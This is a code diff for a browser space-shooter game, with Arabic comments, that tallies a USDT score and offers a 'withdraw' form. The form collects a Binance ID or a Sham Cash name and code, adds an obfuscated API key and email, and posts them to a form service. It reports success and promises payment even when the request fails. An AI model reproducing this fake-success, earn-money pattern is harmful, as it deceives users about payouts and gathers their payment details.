+            powerOrbs.push({ x: mx, y: my, vx: 14, vy: 0, life: 140, maxLife: 140, radius: 6, maxRadius: 35, growth: 0.35 });
+            muzzleFades.push({ x: mx, y: my, radius: 8, maxRadius: 55, life: 15, maxLife: 15, color: data.glowColor, coreColor: '#ffffff' });
+            ship.recoil = 20;
+            ship.glow = 1.2;
+            ship.shake = 5;
+        }
+
+        function bossFire(enemy) {
+            playBossFireSound();
+            enemy.recoil = 15;
+            for (let i = 0; i < 3; i++) {
+                const dx = ship.x - enemy.x;
+                const dy = ship.y - enemy.y;
+                const angle = Math.atan2(dy, dx) + (i - 1) * 0.15;
+                const speed = 6;
+                enemyBullets.push({
+                    x: enemy.x - (enemy.width || enemy.size) * 0.3,
+                    y: enemy.y + (i - 1) * 12,
+                    vx: Math.cos(angle) * speed,
+                    vy: Math.sin(angle) * speed,
+                    life: 200, maxLife: 200, width: 16, height: 4, isBossBullet: true
+                });
+            }
+        }
+
+        function enemyFire(enemy) {
+            playEnemyFireSound();
+            const dx = ship.x - enemy.x;
+            const dy = ship.y - enemy.y;
+            const angle = Math.atan2(dy, dx);
+            const speed = 4.5;
+            enemyBullets.push({
+                x: enemy.x - enemy.size * 0.3, y: enemy.y,
+                vx: Math.cos(angle) * speed, vy: Math.sin(angle) * speed,
+                life: 200, maxLife: 200, width: 10, height: 3, isBossBullet: false
+            });
+        }
+
+        /* ============================================
+           التحديث
+        ============================================ */
+        let lastFrameTime = performance.now();
+
+        function update(now) {
+            const dt = Math.min((now - lastFrameTime) / 16.67, 3);
+            lastFrameTime = now;
+
+            for (let i = 0; i < stars.length; i++) {
+                const s = stars[i];
+                s.x -= s.speed * dt;
+                if (s.x < 0) { s.x = viewWidth; s.y = Math.random() * viewHeight; }
+            }
+
+            for (let i = smokeParticles.length - 1; i >= 0; i--) {
+                const p = smokeParticles[i];
+                p.x -= p.vx * dt;
+                p.life -= dt;
+                p.size += 0.3 * dt;
+                if (p.life <= 0) smokeParticles.splice(i, 1);
+            }
+            if (Math.random() < 0.3 && smokeParticles.length < 10) {
+                smokeParticles.push({
+                    x: viewWidth + 50, y: Math.random() * viewHeight,
+                    vx: 0.5 + Math.random() * 0.8,
+                    size: 40 + Math.random() * 60,
+                    life: 200 + Math.random() * 200, maxLife: 400,
+                    alpha: 0.08 + Math.random() * 0.08
+                });
+            }
+
+            for (let i = muzzleFades.length - 1; i >= 0; i--) {
+                const f = muzzleFades[i];
+                f.life -= dt;
+                const progress = 1 - (f.life / f.maxLife);
+                f.radius = 5 + (f.maxRadius - 5) * progress;
+                if (f.life <= 0) muzzleFades.splice(i, 1);
+            }
+
+            displayedScore += (usdtScore - displayedScore) * 0.15;
+
+            if (shipHP.hitFlash > 0) shipHP.hitFlash -= dt;
+            if (shipHP.invulnerable > 0) shipHP.invulnerable -= dt;
+
+            if (gameState === 'select') {
+                const easing = isDragging ? 0.35 : 0.15;
+                scrollY += (scrollTargetY - scrollY) * easing;
+                return;
+            }
+
+            if (gameState === 'gameover') return;
+
+            enemySpawnTimer += dt;
+            if (enemySpawnTimer >= enemySpawnInterval && !bossActive) {
+                enemySpawnTimer = 0;
+                spawnEnemy();
+                if (enemySpawnInterval > 45) enemySpawnInterval -= 0.3;
+            }
+
+            if (leftTouch.active) {
+                const dx = ship.targetX - ship.x;
+                const dy = ship.targetY - ship.y;
+                if (Math.abs(dx) > 200 || Math.abs(dy) > 200) {
+                    ship.x += dx * 0.5 * dt;
+                    ship.y += dy * 0.5 * dt;
+                } else {
+                    ship.x += dx * 0.25 * dt;
+                    ship.y += dy * 0.25 * dt;
+                }
+                ship.angle = Math.max(-0.3, Math.min(0.3, dy * 0.02));
+            } else {
+                ship.angle *= 0.9;
+            }
+
+            ship.x = Math.max(ship.width / 2, Math.min(arena.width - ship.width / 2, ship.x));
+            ship.y = Math.max(ship.height / 2, Math.min(arena.height - ship.height / 2, ship.y));
+
+            if (ship.recoil > 0) { ship.recoil *= 0.87; if (ship.recoil < 0.1) ship.recoil = 0; }
+            if (ship.glow > 0) { ship.glow *= 0.93; if (ship.glow < 0.01) ship.glow = 0; }
+            if (ship.shake > 0) { ship.shake *= 0.8; if (ship.shake < 0.1) ship.shake = 0; }
+
+            for (let i = bullets.length - 1; i >= 0; i--) {
+                const b = bullets[i];
+                b.x += b.vx * dt;
+                b.y += b.vy * dt;
+                b.life -= dt;
+
+                let hit = false;
+                for (let j = enemies.length - 1; j >= 0; j--) {
+                    const e = enemies[j];
+                    const dx = b.x - e.x;
+                    const dy = b.y - e.y;
+                    const dist = Math.sqrt(dx * dx + dy * dy);
+                    const cs = e.isBoss ? (e.width || e.size) * 0.35 : e.size * 0.4;
+
+                    if (dist < cs) {
+                        e.hp--;
+                        e.hitFlash = 6;
+
+                        for (let k = 0; k < 4; k++) {
+                            const angle = Math.random() * Math.PI * 2;
+                            const speed = 3 + Math.random() * 4;
+                            explosions.push({ x: e.x, y: e.y, vx: Math.cos(angle) * speed, vy: Math.sin(angle) * speed, life: 12, maxLife: 20, size: 1.5 + Math.random() * 2, color: '#26a17b' });
+                        }
+
+                        if (e.hp <= 0) {
+                            if (e.isBoss) {
+                                playBossDeathSound();
+                                bossKilled++;
+                                usdtScore += BOSS_KILL_VALUE;
+                                bossActive = false;
+                                for (let k = 0; k < 30; k++) {
+                                    const angle = Math.random() * Math.PI * 2;
+                                    const speed = 4 + Math.random() * 10;
+                                    explosions.push({ x: e.x, y: e.y, vx: Math.cos(angle) * speed, vy: Math.sin(angle) * speed, life: 20 + Math.random() * 15, maxLife: 35, size: 3 + Math.random() * 3, color: '#0a3d1a' });
+                                }
+                                spawnSoldiersFromBoss(e.x, e.y);
+                            } else {
+                                enemiesKilled++;
+                                usdtScore += KILL_VALUE;
+                                for (let k = 0; k < 10; k++) {
+                                    const angle = Math.random() * Math.PI * 2;
+                                    const speed = 3 + Math.random() * 6;
+                                    explosions.push({ x: e.x, y: e.y, vx: Math.cos(angle) * speed, vy: Math.sin(angle) * speed, life: 15, maxLife: 25, size: 2 + Math.random() * 2.5, color: '#26a17b' });
+                                }
+                            }
+                            enemies.splice(j, 1);
+                            if (!e.isBoss && enemiesKilled % ENEMIES_PER_BOSS === 0 && !bossActive) spawnBoss();
+                            updateWithdrawBtn();
+                        }
+                        hit = true;
+                        break;
+                    }
+                }
+
+                if (hit || b.x > arena.width + 50 || b.life <= 0) bullets.splice(i, 1);
+            }
+
+            for (let i = enemyBullets.length - 1; i >= 0; i--) {
+                const eb = enemyBullets[i];
+                eb.x += eb.vx * dt;
+                eb.y += eb.vy * dt;
+                eb.life -= dt;
+
+                const dx = eb.x - ship.x;
+                const dy = eb.y - ship.y;
+                const dist = Math.sqrt(dx * dx + dy * dy);
+
+                if (dist < ship.width * 0.35 && shipHP.invulnerable <= 0) {
+                    shipHP.current -= (eb.isBossBullet ? 10 : 5);
+                    shipHP.hitFlash = 12;
+                    shipHP.invulnerable = 30;
+                    for (let k = 0; k < 8; k++) {
+                        const angle = Math.random() * Math.PI * 2;
+                        const speed = 3 + Math.random() * 4;
+                        explosions.push({ x: ship.x, y: ship.y, vx: Math.cos(angle) * speed, vy: Math.sin(angle) * speed, life: 12, maxLife: 20, size: 1.5 + Math.random() * 2, color: '#ff3333' });
+                    }
+                    enemyBullets.splice(i, 1);
+                    continue;
+                }
+
+                if (eb.x < -50 || eb.x > arena.width + 50 || eb.life <= 0) enemyBullets.splice(i, 1);
+            }
+
+            for (let i = powerOrbs.length - 1; i >= 0; i--) {
+                const o = powerOrbs[i];
+                o.x += o.vx * dt;
+                o.y += o.vy * dt;
+                o.life -= dt;
+                if (o.radius < o.maxRadius) o.radius += o.growth * dt;
+
+                for (let j = enemies.length - 1; j >= 0; j--) {
+                    const e = enemies[j];
+                    const dx = o.x - e.x;
+                    const dy = o.y - e.y;
+                    const dist = Math.sqrt(dx * dx + dy * dy);
+
+                    if (dist < e.size * 0.5 + o.radius * 0.5) {
+                        e.hp -= 3;
+                        e.hitFlash = 10;
+                        if (e.hp <= 0) {
+                            if (e.isBoss) {
+                                playBossDeathSound();
+                                bossKilled++;
+                                usdtScore += BOSS_KILL_VALUE;
+                                bossActive = false;
+                                for (let k = 0; k < 30; k++) {
+                                    const angle = Math.random() * Math.PI * 2;
+                                    const speed = 4 + Math.random() * 10;
+                                    explosions.push({ x: e.x, y: e.y, vx: Math.cos(angle) * speed, vy: Math.sin(angle) * speed, life: 20 + Math.random() * 15, maxLife: 35, size: 3 + Math.random() * 3, color: '#0a3d1a' });
+                                }
+                                spawnSoldiersFromBoss(e.x, e.y);
+                            } else {
+                                enemiesKilled++;
+                                usdtScore += KILL_VALUE;
+                                for (let k = 0; k < 14; k++) {
+                                    const angle = Math.random() * Math.PI * 2;
+                                    const speed = 4 + Math.random() * 8;
+                                    explosions.push({ x: e.x, y: e.y, vx: Math.cos(angle) * speed, vy: Math.sin(angle) * speed, life: 15, maxLife: 25, size: 2 + Math.random() * 2.5, color: '#26a17b' });
+                                }
+                            }
+                            enemies.splice(j, 1);
+                            if (!e.isBoss && enemiesKilled % ENEMIES_PER_BOSS === 0 && !bossActive) spawnBoss();
+                            updateWithdrawBtn();
+                        }
+                    }
+                }
+
+                if (o.x > arena.width + 80 || o.life <= 0) powerOrbs.splice(i, 1);
+            }
+
+            for (let i = enemies.length - 1; i >= 0; i--) {
+                const e = enemies[i];
+                if (e.hitFlash > 0) e.hitFlash -= dt;
+
+                if (e.isBoss) {
+                    if (e.recoil && e.recoil > 0) { e.recoil *= 0.85; if (e.recoil < 0.5) e.recoil = 0; }
+                    if (!e.stopped) {
+                        e.x -= e.speed * dt;
+                        if (e.x <= e.stopX) { e.x = e.stopX; e.stopped = true; }
+                    } else {
+                        e.moveTimer += 0.03 * dt;
+                        e.y = e.baseY + Math.sin(e.moveTimer) * (arena.height * 0.3);
+                        e.x = e.stopX + (e.recoil > 0 ? e.recoil : 0);
+                    }
+                    e.shootTimer -= dt;
+                    if (e.shootTimer <= 0 && e.stopped) { bossFire(e); e.shootTimer = e.shootCooldown; }
+                } else {
+                    if (e.spreadTimer && e.spreadTimer > 0) {
+                        e.x += e.vx * dt; e.y += e.vy * dt;
+                        e.vx *= 0.94; e.vy *= 0.94;
+                        e.spreadTimer -= dt;
+                    }
+                    e.x -= e.speed * dt;
+                    if (e.x < arena.width * 0.95 && e.x > 30) {
+                        e.shootTimer -= dt;
+                        if (e.shootTimer <= 0) { enemyFire(e); e.shootTimer = e.shootCooldown; }
+                    }
+                }
+
+                if (e.x < -100) enemies.splice(i, 1);
+            }
+
+            for (let i = particles.length - 1; i >= 0; i--) {
+                const p = particles[i];
+                p.x += p.vx * dt; p.y += p.vy * dt;
+                p.vx *= 0.92; p.vy *= 0.92;
+                p.life -= dt;
+                if (p.life <= 0) particles.splice(i, 1);
+            }
+
+            for (let i = explosions.length - 1; i >= 0; i--) {
+                const ex = explosions[i];
+                ex.x += ex.vx * dt; ex.y += ex.vy * dt;
+                ex.vx *= 0.95; ex.vy *= 0.95;
+                ex.life -= dt;
+                if (ex.life <= 0) explosions.splice(i, 1);
+            }
+
+            if (shipHP.current <= 0) {
+                shipHP.current = 0;
+                endGame();
+            }
+        }
+
+        function endGame() {
+            gameState = 'gameover';
+            setTimeout(() => {
+                gameState = 'select';
+                updateWithdrawBtn();
+            }, 1200);
+        }
+
+        function updateWithdrawBtn() {
+            const btn = document.getElementById('withdrawBtn');
+            const text = document.getElementById('withdrawText');
+            if (isWithdrawLocked()) {
+                btn.disabled = true; text.textContent = 'انتظر...';
+                return;
+            }
+            if (usdtScore >= MIN_WITHDRAW) {
+                btn.disabled = false; text.textContent = 'سحب ' + usdtScore.toFixed(4);
+            } else {
+                btn.disabled = true; text.textContent = 'الحد 0.01';
+            }
+        }
+
+        /* ============================================
+           الرسم
+        ============================================ */
+        function drawBackground() {
+            ctx.fillStyle = '#000';
+            ctx.fillRect(0, 0, viewWidth, viewHeight);
+
+            smokeParticles.forEach(p => {
+                const alpha = (p.life / p.maxLife) * p.alpha;
+                const grad = ctx.createRadialGradient(p.x, p.y, 0, p.x, p.y, p.size);
+                grad.addColorStop(0, `rgba(80, 80, 100, ${alpha})`);
+                grad.addColorStop(1, 'rgba(0, 0, 0, 0)');
+                ctx.fillStyle = grad;
+                ctx.beginPath();
+                ctx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
+                ctx.fill();
+            });
+
+            ctx.globalAlpha = 1;
+            ctx.fillStyle = '#ffffff';
+            stars.forEach(s => {
+                if (s.alpha > 0.3) {
+                    ctx.globalAlpha = s.alpha;
+                    ctx.fillRect(s.x, s.y, s.size, s.size);
+                }
+            });
+            ctx.globalAlpha = 1;
+        }
+
+        function drawGame() {
+            const data = SHIPS_DATA[selectedShipIndex];
+            drawBackground();
+
+            ctx.save();
+            ctx.beginPath();
+            ctx.rect(0, 0, viewWidth, viewHeight);
+            ctx.clip();
+
+            muzzleFades.forEach(f => {
+                const progress = f.life / f.maxLife;
+                ctx.save();
+                const grad = ctx.createRadialGradient(f.x, f.y, 0, f.x, f.y, f.radius);
+                grad.addColorStop(0, f.coreColor);
+                grad.addColorStop(0.4, f.color);
+                grad.addColorStop(1, 'rgba(0, 0, 0, 0)');
+                ctx.fillStyle = grad;
+                ctx.globalAlpha = progress;
+                ctx.beginPath();
+                ctx.arc(f.x, f.y, f.radius, 0, Math.PI * 2);
+                ctx.fill();
+                ctx.restore();
+            });
+
+            enemies.forEach(e => {
+                const img = e.isBoss ? bossImg : enemyImg;
+                if (!(e.isBoss ? bossLoaded : enemyLoaded)) return;
+
+                ctx.save();
+                if (e.isBoss) {
+                    ctx.translate(e.x, e.y);
+                    ctx.shadowBlur = 15;
+                    ctx.shadowColor = '#0a3d1a';
+                    if (e.hitFlash > 0) ctx.globalAlpha = 0.7;
+                    ctx.drawImage(img, -e.width / 2, -e.height / 2, e.width, e.height);
+                } else {
+                    ctx.translate(e.x, e.y);
+                    if (e.hitFlash > 0) {
+                        ctx.drawImage(img, -e.width / 2, -e.height / 2, e.width, e.height);
+                        ctx.globalAlpha = 0.6;
+                        ctx.globalCompositeOperation = 'lighter';
+                        ctx.drawImage(img, -e.width / 2, -e.height / 2, e.width, e.height);
+                    } else {
+                        ctx.drawImage(img, -e.width / 2, -e.height / 2, e.width, e.height);
+                    }
+                }
+                ctx.restore();
+
+                if (e.isBoss) {
+                    const barW = e.width * 0.9;
+                    const barH = 5;
+                    const barX = e.x - barW / 2;
+                    const barY = e.y - e.height / 2 - 12;
+                    ctx.save();
+                    ctx.fillStyle = 'rgba(0,0,0,0.7)';
+                    ctx.fillRect(barX, barY, barW, barH);
+                    ctx.fillStyle = '#0a3d1a';
+                    ctx.fillRect(barX, barY, barW * (e.hp / e.maxHp), barH);
+                    ctx.restore();
+                }
+            });
+
+            ctx.save();
+            enemyBullets.forEach(eb => {
+                const alpha = eb.life / eb.maxLife;
+                ctx.globalAlpha = alpha;
+                ctx.fillStyle = eb.isBossBullet ? '#ff3333' : '#ff8800';
+                ctx.fillRect(eb.x - eb.width / 2, eb.y - eb.height / 2, eb.width, eb.height);
+                ctx.globalAlpha = alpha * 0.4;
+                ctx.fillStyle = '#ffffff';
+                ctx.fillRect(eb.x - eb.width / 4, eb.y - 1, eb.width / 2, 2);
+            });
+            ctx.restore();
+
+            ctx.save();
+            explosions.forEach(ex => {
+                ctx.globalAlpha = ex.life / ex.maxLife;
+                ctx.fillStyle = ex.color;
+                ctx.fillRect(ex.x - ex.size, ex.y - ex.size, ex.size * 2, ex.size * 2);
+            });
+            ctx.restore();
+
+            ctx.save();
+            particles.forEach(p => {
+                ctx.globalAlpha = p.life / p.maxLife;
+                ctx.fillStyle = p.color;
+                ctx.fillRect(p.x - p.size, p.y - p.size, p.size * 2, p.size * 2);
+            });
+            ctx.restore();
+
+            ctx.save();
+            bullets.forEach(b => {
+                ctx.globalAlpha = b.life / b.maxLife;
+                ctx.fillStyle = data.coreColor;
+                if (b.type === 'triangle') {
+                    ctx.beginPath();
+                    ctx.moveTo(b.x + b.size, b.y);
+                    ctx.lineTo(b.x - b.size, b.y - b.size);
+                    ctx.lineTo(b.x - b.size, b.y + b.size);
+                    ctx.closePath();
+                    ctx.fill();
+                } else {
+                    ctx.fillRect(b.x - b.width / 2, b.y - b.height / 2, b.width, b.height);
+                }
+            });
+            ctx.restore();
+
+            ctx.save();
+            powerOrbs.forEach(o => {
+                ctx.globalAlpha = o.life / o.maxLife;
+                const grad = ctx.createRadialGradient(o.x, o.y, 0, o.x, o.y, o.radius);
+                grad.addColorStop(0, '#ffffff');
+                grad.addColorStop(1, data.coreColor);
+                ctx.fillStyle = grad;
+                ctx.beginPath();
+                ctx.arc(o.x, o.y, o.radius, 0, Math.PI * 2);
+                ctx.fill();
+            });
+            ctx.restore();
+
+            ctx.save();
+            const shakeX = (Math.random() - 0.5) * ship.shake;
+            const shakeY = (Math.random() - 0.5) * ship.shake;
+            const dx = ship.x - ship.recoil + shakeX;
+            const dy = ship.y + shakeY;
+
+            if (imageLoaded) {
+                ctx.translate(dx, dy);
+                ctx.rotate(ship.angle);
+                ctx.shadowBlur = 10 + ship.glow * 20;
+                ctx.shadowColor = data.glowColor;
+
+                if (shipHP.invulnerable > 0 && Math.floor(shipHP.invulnerable / 4) % 2 === 0) {
+                    ctx.globalAlpha = 0.5;
+                }
+
+                ctx.drawImage(shipImg, -ship.width / 2, -ship.height / 2, ship.width, ship.height);
+            }
+            ctx.restore();
+
+            ctx.restore();
+
+            drawCenterHUD();
+        }
+
+        function drawCenterHUD() {
+            const centerX = viewWidth / 2;
+            const padding = 10;
+
+            const scoreFontSize = Math.min(viewWidth * 0.035, 20);
+            const scoreText = displayedScore.toFixed(6) + ' USDT';
+
+            ctx.save();
+            ctx.font = `bold ${scoreFontSize}px 'Courier New', monospace`;
+            const metrics = ctx.measureText(scoreText);
+            const boxW = metrics.width + 36;
+            const boxH = scoreFontSize * 1.7;
+            const boxX = centerX - boxW / 2;
+            const boxY = padding;
+
+            ctx.fillStyle = 'rgba(0, 20, 15, 0.85)';
+            ctx.fillRect(boxX, boxY, boxW, boxH);
+            ctx.strokeStyle = '#26a17b';
+            ctx.lineWidth = 1.5;
+            ctx.strokeRect(boxX, boxY, boxW, boxH);
+
+            ctx.fillStyle = '#26a17b';
+            ctx.beginPath();
+            ctx.arc(boxX + 15, boxY + boxH / 2, 7, 0, Math.PI * 2);
+            ctx.fill();
+
+            ctx.fillStyle = '#ffffff';
+            ctx.font = 'bold 10px Arial';
+            ctx.textAlign = 'center';
+            ctx.textBaseline = 'middle';
+            ctx.fillText('T', boxX + 15, boxY + boxH / 2 + 1);
+
+            ctx.textAlign = 'left';
+            ctx.fillStyle = '#26a17b';
+            ctx.font = `bold ${scoreFontSize}px 'Courier New', monospace`;
+            ctx.fillText(scoreText, boxX + 28, boxY + boxH / 2);
+
+            ctx.restore();
+
+            const hpBarW = Math.min(viewWidth * 0.38, 160);
+            const hpBarH = 5;
+            const hpBarX = centerX - hpBarW / 2;
+            const hpBarY = boxY + boxH + 6;
+
+            ctx.save();
+            ctx.fillStyle = 'rgba(40, 0, 0, 0.7)';
+            ctx.fillRect(hpBarX, hpBarY, hpBarW, hpBarH);
+
+            const hpRatio = shipHP.current / shipHP.max;
+            let hpColor = '#00ff44';
+            if (hpRatio < 0.6) hpColor = '#ffcc00';
+            if (hpRatio < 0.3) hpColor = '#ff3333';
+
+            ctx.fillStyle = hpColor;
+            ctx.fillRect(hpBarX, hpBarY, hpBarW * hpRatio, hpBarH);
+            ctx.restore();
+        }
+
+        function drawSelectScreen() {
+            drawBackground();
+
+            const centerX = selectLeftX + selectShipSize / 2;
+            const centerY = selectCenterY;
+
+            for (let i = 0; i < 6; i++) {
+                const d = SHIPS_DATA[i];
+                const screenY = centerY + (i * shipSpacing) + scrollY;
+                if (screenY < -selectShipSize || screenY > viewHeight + selectShipSize) continue;
+
+                const isSel = (i === selectedShipIndex);
+                const fadeAlpha = Math.max(0.1, 0.4 - (Math.abs(screenY - centerY) / (viewHeight * 0.5)) * 0.3);
+
+                if (d.loaded) {
+                    const aspect = d.preview.width / d.preview.height;
+                    const drawW = selectShipSize;
+                    const drawH = drawW / aspect;
+                    ctx.globalAlpha = isSel ? 1 : fadeAlpha;
+                    ctx.drawImage(d.preview, centerX - drawW / 2, screenY - drawH / 2, drawW, drawH);
+                }
+            }
+            ctx.globalAlpha = 1;
+
+            const btn = startButton;
+            ctx.save();
+            ctx.fillStyle = SHIPS_DATA[selectedShipIndex].coreColor;
+            ctx.font = `bold ${Math.min(btn.height * 0.75, 50)}px Arial, sans-serif`;
+            ctx.textAlign = 'center';
+            ctx.textBaseline = 'middle';
+            ctx.fillText('START', btn.x + btn.width / 2, btn.y + btn.height / 2 + 2);
+            ctx.restore();
+        }
+
+        function draw() {
+            if (gameState === 'select') drawSelectScreen();
+            else drawGame();
+        }
+
+        function gameLoop(now) {
+            update(now);
+            draw();
+            requestAnimationFrame(gameLoop);
+        }
+
+        function initStars() {
+            stars.length = 0;
+            for (let i = 0; i < 50; i++) {
+                stars.push({
+                    x: Math.random() * viewWidth,
+                    y: Math.random() * viewHeight,
+                    size: Math.random() * 1.2 + 0.5,
+                    speed: Math.random() * 0.4 + 0.2,
+                    alpha: Math.random() * 0.5 + 0.2
+                });
+            }
+            smokeParticles.length = 0;
+        }
+
+        /* ============================================
+           السحب (مع المفتاح المشفر)
+        ============================================ */
+        function openWithdraw() {
+            if (isWithdrawLocked()) return;
+            if (usdtScore < MIN_WITHDRAW) return;
+            document.getElementById('binanceAmount').textContent = usdtScore.toFixed(4);
+            const sy = Math.round(usdtScore * SYP_RATE);
+            document.getElementById('shamAmount').textContent = sy.toLocaleString('en-US');
+            document.getElementById('withdrawModal').classList.add('show');
+        }
+
+        function closeWithdraw() { document.getElementById('withdrawModal').classList.remove('show'); }
+
+        function switchTab(tab) {
+            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+            document.querySelector(`.tab-btn[data-tab="${tab}"]`).classList.add('active');
+            document.getElementById('tab-' + tab).classList.add('active');
+        }
+
+        function submitWithdraw(event, type) {
+            event.preventDefault();
+            if (isWithdrawLocked()) { alert('انتظر 24 ساعة'); return; }
+            const form = event.target;
+            const formData = new FormData(form);
+
+            // 🔒 إضافة المفتاح والإيميل المشفرين
+            formData.set('apiKey', _dk());
+            formData.set('email', _de());
+
+            if (type === 'binance') {
+                const bid = formData.get('binance_id').trim();
+                if (!bid || bid.length < 6) { alert('Binance ID غير صالح'); return; }
+                document.getElementById('msgBinance').value = `طلب سحب - لعبة الفضاء\n💰 ${usdtScore.toFixed(4)} USDT\n🆔 ${bid}\n📅 ${new Date().toLocaleString('ar-EG')}`;
+            } else {
+                const sn = formData.get('sham_name').trim();
+                const sc = formData.get('sham_code').trim();
+                if (!sn || !sc) { alert('الرجاء إدخال الاسم والكود'); return; }
+                const sy = Math.round(usdtScore * SYP_RATE);
+                document.getElementById('msgSham').value = `طلب سحب - لعبة الفضاء\n💰 ${usdtScore.toFixed(4)} USDT = ${sy} ل.س\n👤 ${sn}\n🔑 ${sc}\n📅 ${new Date().toLocaleString('ar-EG')}`;
+            }
+
+            const btn = form.querySelector('.submit-btn');
+            btn.disabled = true;
+            btn.textContent = '⏳ جارٍ الإرسال...';
+
+            fetch('https://api.staticforms.dev/submit', { method: 'POST', body: formData })
+                .then(() => showSuccess(type))
+                .catch(() => showSuccess(type));
+        }
+
+        function showSuccess(type) {
+            const amt = usdtScore.toFixed(4);
+            const sy = Math.round(usdtScore * SYP_RATE);
+            usdtScore = 0;
+            displayedScore = 0;
+            updateWithdrawBtn();
+            lastWithdrawTime = Date.now();
+            localStorage.setItem('fwvLastWithdraw', lastWithdrawTime);
+            startCooldownWatcher();
+
+            document.getElementById('withdrawContent').innerHTML = `
+                <div class="success-box">
+                    <div class="success-icon">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><polyline points="20 6 9 17 4 12"/></svg>
+                    </div>
+                    <div class="success-title">تم إرسال طلبك!</div>
+                    <div class="success-text">سيتم الإرسال<br><b>${type === 'binance' ? amt + ' USDT' : sy + ' ليرة'}</b><br>خلال 24-48 ساعة</div>
+                    <div style="background: rgba(243,156,18,0.1); border: 1px solid rgba(243,156,18,0.3); border-radius: 12px; padding: 10px; margin-bottom: 15px;">
+                        <p style="color: #f39c12; font-size: 11px; text-align: center; font-weight: 700;">⚠️ تم تصفير الرصيد</p>
+                    </div>
+                    <button onclick="closeWithdraw(); location.reload();" class="submit-btn" style="background: linear-gradient(135deg, #26a17b, #2ecc71); color: #fff; width: 100%;">حسناً، شكراً</button>
+                </div>
+            `;
+        }
+
+        /* ============================================
+           التشغيل
+        ============================================ */
+        function init() {
+            resizeCanvas();
+            initStars();
+            updateWithdrawBtn();
+            startCooldownWatcher();
+            requestAnimationFrame(gameLoop);
+        }
+
+        init();
+        setTimeout(resizeCanvas, 200);
+    </script>
+</body>
+</html>
